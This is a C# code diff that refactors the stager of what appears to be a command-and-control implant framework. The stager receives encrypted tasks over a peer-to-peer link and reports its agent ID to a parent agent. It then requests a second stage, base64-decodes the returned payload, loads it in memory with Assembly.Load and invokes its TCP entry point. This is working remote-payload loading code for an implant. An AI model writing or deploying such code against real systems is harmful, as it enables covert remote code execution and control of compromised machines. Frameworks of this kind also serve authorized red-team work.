@@ -23,7 +23,7 @@ namespace Stager
 
         static bool Staged = false;
 
-        public delegate void StagerCommand(C2Data C2Data);
+        public delegate void StagerCommand(AgentTask Task);
 
         public Stager()
         {
@@ -63,37 +63,41 @@ namespace Stager
             {
                 if (CommModule.RecvData(out AgentMessage Message))
                 {
-                    var c2Data = Crypto.Decrypt<C2Data>(Message.Data, Message.IV);
+                    var task = Crypto.Decrypt<AgentTask>(Message.Data, Message.IV);
 
                     var callback = StagerModule.Commands
-                        .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
+                        .FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase))
                         .Delegate;
 
-                    callback?.Invoke(c2Data);
+                    callback?.Invoke(task);
                 }
             }
         }
 
-        static void Link0Response(C2Data C2Data)
+        static void Link0Response(AgentTask Task)
         {
-            var link0RequestData = Encoding.UTF8.GetString(C2Data.Data);
+            var placeholder = (string)Task.Parameters["Placeholder"];
+            ParentAgentID = (string)Task.Parameters["ParentAgentID"];
 
-            var placeholder = link0RequestData.Substring(0, 6);
-            ParentAgentID = link0RequestData.Substring(6, 6);
-
-            var c2Data = Utilities.SerialiseData(
-                new C2Data
+            var task = Crypto.Encrypt(
+                new AgentTask
                 {
                     Module = "Link",
                     Command = "Link0Response",
-                    Data = Encoding.UTF8.GetBytes(string.Concat(placeholder, AgentID))
-                });
+                    Parameters = new Dictionary<string, object>
+                    {
+                        { "Placeholder", placeholder },
+                        { "AgentID", AgentID }
+                    }
+                },
+                out byte[] iv);
 
             CommModule.SendData(
                 new AgentMessage
                 {
                     AgentID = ParentAgentID,
-                    Data = c2Data
+                    Data = task,
+                    IV = iv
                 });
 
             Thread.Sleep(5000);
@@ -107,7 +111,8 @@ namespace Stager
                 new C2Data
                 {
                     Module = "Core",
-                    Command = "StageRequest"
+                    Command = "StageRequest",
+                    Data = Encoding.UTF8.GetBytes(ParentAgentID)
                 },
                 out byte[] iv);
 
@@ -120,12 +125,13 @@ namespace Stager
                 });
         }
 
-        static void StageResponse(C2Data C2Data)
+        static void StageResponse(AgentTask Task)
         {
             CommModule.Stop();
             Staged = true;
 
-            var asm = Assembly.Load(C2Data.Data);
+            var bytes = Convert.FromBase64String((string)Task.Parameters["Stage"]);
+            var asm = Assembly.Load(bytes);
 
             asm.GetType("Agent.Stage").GetMethod("TCPEntry").Invoke(null, new object[]
             {
